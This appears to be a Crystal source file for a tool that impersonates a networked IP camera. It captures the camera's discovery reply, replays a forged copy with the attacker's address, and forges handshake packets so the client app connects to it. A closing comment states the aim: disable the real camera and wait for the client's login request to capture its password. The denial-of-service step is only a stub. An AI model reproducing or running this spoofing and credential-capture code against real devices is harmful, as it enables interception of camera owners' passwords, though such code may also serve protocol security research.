require "./client"
require "./ifconfig"

class AntiClient < Client
  STATES = [:nothing,
            :listen_for_client_dbp,
            :listen_for_camera_dbr,
            :ddos_camera,
            :wait_for_client_dbp,
            :send_dbr,
            :wait_for_client_bcp,
            :send_bps,
            :handle_bp_handshake,
            :main_phase,
            :closing,
            :closed]

  # The destination address the camera sends to
  DB_SOCK_CAMERA_SRC = Socket::IPAddress.new("0.0.0.0", 8600)

  # Destination address for the DBR 
  DB_SOCK_CAMERA_DST = Socket::IPAddress.new("255.255.255.255", 6801)

  # Listening address for the f130 broadcast packet
  BC_SOCK_CAMERA_SRC = Socket::IPAddress.new("0.0.0.0", 32108)

  #BC_SOCK_CAMERA_DST IS UNKNOWN! We need to wait for a client to connect to us.

  getter db_camera_sock = UDPSocket.new
  getter db_client_sock = UDPSocket.new
  getter bc_camera_sock = UDPSocket.new
  getter dbr = {} of Symbol => String

  def setup_ports
    super
    
    # Our socket for recieving discovery broadcasts and sending DBRs
    @db_camera_sock = UDPSocket.new
    @db_camera_sock.bind DB_SOCK_CAMERA_SRC
    @db_camera_sock.setsockopt LibC::SO_BROADCAST, 1


    @bc_camera_sock = UDPSocket.new
    @bc_camera_sock.bind BC_SOCK_CAMERA_SRC
    @bc_camera_sock.setsockopt LibC::SO_BROADCAST, 1
  end

  def run
    # Dont allow the client to run again!
    if !is_running?
      @is_running = true
      # Change the state so it will attempt to discover a camera on the network
      @state = STATES[1]
      #Start our fibers
      start_data_fiber
      start_tick_fiber
    else
      LOG.error "ALREADY RUNNING SERVER!" 
    end
  end

  def listen_for_client_dbp
    got_dbp = false
    LOG.info("Waiting to receive the DBP from a client")
    until got_dbp
      potential_dbp = @db_camera_sock.receive
      got_dbp = true if potential_dbp[0] == DBP
    end
    got_dbp
  end

  def listen_for_camera_dbr
    got_dbr = false
    LOG.info("Waiting to receive the DBR from a camera")
    until got_dbr
      potential_dbr = @db_client_sock.receive
      LOG.info("Got a potential DBR from a client")

      got_dbr = true if potential_dbr[0][0..3] == DBR_HEADER
    end
    if potential_dbr
      @dbr = Client.parse_dbr potential_dbr
      @dbr
    else
      puts "idk what happened"
      nil
    end
  end

  def ddos_camera
    sleep 10
  end

  # Makes a DBR given a dbr_hash
  def make_dbr(dbr_hash) : String
    dbr = DBR_HEADER
    # Need to ljust for \x00 padding
    dbr += dbr_hash[:camera_ip].ljust(DBR_CAMERA_IP.size,"\x00"[0])
    dbr += dbr_hash[:netmask].ljust(DBR_NETMASK.size,"\x00"[0])
    dbr += dbr_hash[:gateway].ljust(DBR_GATEWAY.size,"\x00"[0])
    dbr += dbr_hash[:dns1].ljust(DBR_DNS1.size,"\x00"[0])
    dbr += dbr_hash[:dns2].ljust(DBR_DNS2.size,"\x00"[0])
    dbr += dbr_hash[:mac_address].split(':').map {|byte| Helpers.u16_to_bytechars byte.to_i(16)}.join
    hex_http_port = dbr_hash[:http_port].to_i.to_s(16).rjust(4, '0')
    big_i = Helpers.u16_to_bytechars hex_http_port[0..1].to_i(16)
    little_i = Helpers.u16_to_bytechars hex_http_port[2..3].to_i(16)
    
    dbr += little_i
    dbr += big_i
    dbr += dbr_hash[:uid].ljust(DBR_UID.size,"\x00"[0])
    dbr += dbr_hash[:name].ljust(DBR_NAME.size,"\x00"[0])
    dbr += dbr_hash[:ddns_ip].ljust(DBR_DDNS_IP.size,"\x00"[0])
    dbr += dbr_hash[:unknown1] # Single byte
    dbr += dbr_hash[:ddns_url].ljust(DBR_DDNS_URL.size,"\x00"[0])
    dbr += dbr_hash[:sn].ljust(DBR_SN.size,"\x00"[0])
    dbr += dbr_hash[:ddns_password].ljust(DBR_DDNS_PASSWORD.size,"\x00"[0])
    #dbr += dbr_hash[:unknown2] # Single byte
    #hex_dbr_port = dbr_hash[:port].to_i.to_s(16).rjust(4, 0)
    #big_i = Helpers.u16_to_bytechars hex_dbr_port[0..1].to_i(16)
    #littlei_ = Helpers.u16_to_bytechars hex_dbr_port[2..3].to_i(16)
    #dbr += big_i
    #dbr += little_i
    #dbr += "\xff" * 4
    dbr
  end

  def send_dbr(dbr_hash : Hash(Symbol, String))
    dbr = make_dbr(dbr_hash)
    send_dbr dbr
  end

  def send_dbr(dbr_string : String)
    @db_camera_sock.send(dbr_string, DB_SOCK_CAMERA_DST)
    #@db_camera_sock.send(dbr_string, target)
  end

  def listen_for_client_bcp
    got_bcp = false
    until got_bcp
      potential_bcp = @bc_camera_sock.receive
      if potential_bcp && potential_bcp[0] == BCP
        got_bcp = true
        new_target potential_bcp[1]
        puts potential_bcp[1]
      end
    end
    got_bcp
  end

  def make_bps(uid)
    bps = BPS_HEADER
    bps += uid[0x0..0x3]
    bps += "\x00" * 5
    uid2 = uid[0x4..0x9].to_i
    bps += String.new(Bytes[(uid2 & 0xff0000) >> 16, (uid2 & 0xff00) >> 8, uid2 & 0xff])
    bps += uid[0xa..0xf]
    bps += "\x00"*3
    bps
  end

  def send_bps(uid)
    bps = make_bps uid
    @data_sock.send(bps, target)
  end

  def receive_bps
    got_bps = false
    until got_bps
      potential_bps = @data_channel.receive
      puts potential_bps
      if potential_bps[0][0..3] == BPS_HEADER
        got_bps = true
      end
    end
    got_bps
  end

  def make_bpa(uid)
    bpa = BPA_HEADER
    bpa += uid[0x0..0x3]
    bpa += "\x00" * 5
    uid2 = uid[0x4..0x9].to_i
    bpa += String.new(Bytes[(uid2 & 0xff0000) >> 16, (uid2 & 0xff00) >> 8, uid2 & 0xff])
    bpa += uid[0xa..0xf]
    bpa += "\x00"*3
    bpa
  end

  def send_bpa(uid)
    bpa = make_bpa uid
    @data_sock.send(bpa, target)
  end

  def main_phase
    # Block here to receive data from the data fiber
    data = @data_channel.receive

    # Classify each packet and respond
    if data[0] == PING_PACKET
      send_pong
    elsif data[0] == PONG_PACKET
      send_ping
    elsif data[0] == DISCONNECT_PACKET
      LOG.info "RECEIVED DISCONNECT FROM CAMERA"
    # This is important! The data fiber will block, waiting for data to come through
    # So to exit the program, we just send the unblock data to the data socket to free it
    elsif data[0] == UNBLOCK_FIBER_DATA
      LOG.info "RECEIVED UNBLOCK FIBER COMMAND!"
    else
      LOG.info "UNKNOWN PACKET RECEIVED from #{data[1]} : #{data[0].bytes.map {|d| d.to_s(16).rjust(2, '0')}.join("\\x")}"
    end
  end

  def tick
    if state == :nothing
      # Do nothing
    elsif state == :listen_for_client_dbp
      listen_for_client_dbp
      change_state :listen_for_camera_dbr
    elsif state == :listen_for_camera_dbr
      listen_for_camera_dbr
      change_state(:ddos_camera)
    elsif state == :ddos_camera
      ddos_camera
      change_state(:wait_for_client_dbp)
    elsif state == :wait_for_client_dbp
      listen_for_client_dbp
      change_state :send_dbr
    elsif state == :send_dbr
      network_info = IfConfig.get[0]
      @dbr[:camera_ip] = network_info.ipv4_address
      @dbr[:mac_address] = network_info.mac_address
      send_dbr @dbr
      change_state :wait_for_client_bcp
    elsif state == :wait_for_client_bcp
      listen_for_client_bcp
      sleep 1
      change_state :send_bps
    elsif state == :send_bps
      send_bps @dbr[:uid]
      change_state :receive_bps
    elsif state == :receive_bps
      receive_bps
      change_state :send_4_bpa
    elsif state == :send_4_bpa
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      send_bpa(@dbr[:uid])
      change_state :main_phase
    elsif state == :main_phase
      main_phase
    else
      raise "THERE WAS A BAD IN TICK!"
    end
  end

  # Order of things
  # 1. Wait for DBP from client (f130 from 8600) (client to 255.255.255.255)
  # 2. Capture DBR from camera  (44480108 from 6801) (camera to 255.255.255.255)
  #   - Get UID, change IP, MAC, and/or other info.
  # 3. DDOS camera
  # 4. Wait for new DBP from client
  # 5. Replay DBR
  # 6. Wait for BCP from client
  # 7. Forge BPS to client
  # 8. Wait for BPS from client
  # 9. Forge BPA to client.
  # 10. Main phase, ping pong, wait for a GET with login params.
  # 11. Once we get password, send disconnect, and close server.

  
end